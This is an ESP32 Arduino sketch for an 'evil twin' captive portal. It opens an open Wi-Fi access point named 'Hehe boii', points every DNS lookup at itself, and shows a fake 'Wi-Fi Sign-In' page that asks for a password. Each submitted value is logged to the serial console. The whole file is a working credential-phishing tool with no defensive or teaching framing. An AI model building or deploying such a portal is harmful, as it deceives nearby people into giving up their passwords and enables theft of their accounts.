#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// ====== TUNE THESE ======
const char* EVIL_SSID = "Hehe boii";
const char* EVIL_PASS = "";
// ========================

IPAddress apIP(192,168,4,1);
DNSServer dns;
WebServer server(80);

const byte DNS_PORT = 53;

const char PAGE[] PROGMEM = R"HTML(
<!doctype html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Sign-In</title>
<style>
body{font-family:system-ui;margin:2rem;max-width:520px}
.card{padding:1.2rem;border:1px solid #ddd;border-radius:12px}
input,button{width:100%;padding:.8rem;margin:.4rem 0;border-radius:10px;border:1px solid #ccc}
button{border:0}
</style></head><body>
<h2>Internet Access</h2>
<div class="card">
  <p>Please confirm access to continue.</p>
  <form method="POST" action="/submit">
    <input name="note" placeholder="Password" required>
    <button type="submit">Continue</button>
  </form>
</div>
</body></html>
)HTML";

void handleRoot() {
  server.send(200, "text/html", PAGE);
}

void handleSubmit() {
  if (server.hasArg("note")) {
    String v = server.arg("note");
    Serial.printf("[Portal] Received: %s\n", v.c_str());
  }
  server.sendHeader("Location", "/");
  server.send(302);
}

// Catch-all: anything → portal
void handleNotFound() {
  server.sendHeader("Location", "/");
  server.send(302);
}

void setup() {
  Serial.begin(115200);
  delay(500);

  // Bring up open AP
  WiFi.mode(WIFI_MODE_AP);
  bool ok = WiFi.softAP(EVIL_SSID, EVIL_PASS); // open AP
  if (!ok) Serial.println("[Portal] softAP failed");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  Serial.printf("[Portal] AP up: %s | IP: %s\n", EVIL_SSID, WiFi.softAPIP().toString().c_str());

  // DNS: wildcard → our IP
  dns.start(DNS_PORT, "*", apIP);

  // HTTP
  server.on("/", HTTP_GET, handleRoot);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.onNotFound(handleNotFound);
  server.begin();
  Serial.println("[Portal] Web + DNS running");
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
}
